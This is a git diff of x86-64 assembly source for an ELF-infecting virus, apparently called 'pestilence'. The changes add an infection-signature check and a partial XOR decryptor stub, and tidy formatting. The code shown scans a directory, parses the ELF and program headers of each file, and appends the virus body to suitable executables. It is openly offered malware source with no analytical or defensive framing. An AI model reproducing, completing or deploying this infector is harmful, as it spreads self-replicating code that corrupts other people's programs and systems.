@@ -1,10 +1,10 @@
 ; SYSCALLS
 %define SYS_EXIT		60
 %define SYS_OPEN		2
-%define SYS_CLOSE	   3
-%define SYS_WRITE	   1
+%define SYS_CLOSE		3
+%define SYS_WRITE		1
 %define SYS_READ		0
-%define SYS_EXECVE	  59
+%define SYS_EXECVE		59
 %define SYS_GETDENTS64	217
 %define SYS_FSTAT		5
 %define SYS_LSEEK		8
@@ -37,7 +37,7 @@
 ; OPEN MODES
 %define O_RDONLY		00000000
 %define O_WRONLY		00000001
-%define O_RDWR		  00000002
+%define O_RDWR			00000002
 
 %define argv0			[rsp + 8]
 %define argc			[rsp + 4]
@@ -106,10 +106,12 @@ _start:
 	mov r12, rax ; backup fd
 	mov rax, SYS_PREAD64
 	mov rdi, r12
-	lea rsi, [r15 + 563]
+	lea rsi, [r15 + 563] ; cmp signature
 	mov rdx, 4
 	mov r10, 8
 	syscall
+	cmp dword [r15 + 563], SIGNATURE
+	jne infector
 	mov rax, SYS_PREAD64
 	mov rdi, r12
 	lea rsi, [r15 + 567] ; save encryption zone start
@@ -129,10 +131,22 @@ _start:
 	syscall
 	cmp rax, 0
 	jl _end
-	cmp dword [r15 + 563], SIGNATURE
-	jne .infector
-.decryptor:
-	; xor rcx, rcx
+
+decryptor:
+	lea r10, [rel _start]
+	mov rcx, [r15 + 567]
+	mov rdx, [r15 + 571]
+	; cmp rcx, rdx
+	; jg _end
+	; .loop:
+	; 	cmp rdx, rcx
+	; 	jb _end
+	; 	jne .loop
+	; 	inc rcx
+	; 	cmp rdx, rcx
+	; 	jne .loop
+		; xor byte [r10], 42
+
 	; .loop:
 	; 	lea rdi, [rel _start]
 	; 	add rdi, rcx
@@ -142,7 +156,7 @@ _start:
 	; 	inc rcx
 	; 	cmp rcx, pestilence - .infector
 	; 	jne .loop
-.infector:
+infector:
 	call set_folder_chdir
 	chdir:
 		pop rdi
@@ -190,11 +204,11 @@ _start:
 			mov rax, SYS_OPEN
 			syscall
 
-			cmp rax, 0										; if can't open file, _end now
-			jbe .continue
+			cmp rax, 0										; if can't open file, .continue to next file
+			jl .continue
 			mov r12, rax
 		.read_ehdr:
-			mov rdi, r12										; r12 contains fd
+			mov rdi, r12									; r12 contains fd
 			lea rsi, [r15 + 144]							; rsi = ehdr = [r15 + 144]
 			mov rdx, 64										; ehdr.size
 			mov r10, 0										; read at offset 0
@@ -213,7 +227,7 @@ _start:
 		xor r14, r14										; r14 will hold phdr file offset
 
 		.loop_phdr:
-			mov rdi, r12										; r12 contains fd
+			mov rdi, r12									; r12 contains fd
 			lea rsi, [r15 + 208]							; rsi = phdr = [r15 + 208]
 			mov dx, word [r15 + 198]						; ehdr.phentsize is at [r15 + 198]
 			mov r10, r8										; read at ehdr.phoff from r8 (incrementing ehdr.phentsize each loop iteraction)
@@ -225,7 +239,7 @@ _start:
 			jz .infect										; if yes, bingo, start infecting
 
 			inc rbx											; if not, increase rbx counter
-			cmp bx, word [r15 + 200]							; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
+			cmp bx, word [r15 + 200]						; check if we looped through all phdrs already (ehdr.phnum = [r15 + 200])
 			jge .close_file									; _end if no valid phdr for infection was found
 
 			add r8w, word [r15 + 198]						; otherwise, add current ehdr.phentsize from [r15 + 198] into r8w
@@ -246,7 +260,7 @@ _start:
 				syscall 
 			.append_virus:
 				; getting target EOF
-				mov rdi, r12									; r12 contains fd
+				mov rdi, r12								; r12 contains fd
 				mov rsi, 0									
 				mov rdx, SEEK_END							; seek to end of file
 				mov rax, SYS_LSEEK
@@ -259,7 +273,7 @@ _start:
 					sub rbp, .delta							; rbp = target EOF - current EOF
 
 				; writing virus body to EOF pwrite(fd, *buff, count, offset)
-				mov rdi, r12									; r12 contains target fd
+				mov rdi, r12								; r12 contains target fd
 				lea rsi, [rbp + _start]						; loading _start address in rsi
 				mov rdx, _end - _start						; virus size
 				mov r10, rax								; rax contains target EOF offset from previous syscall
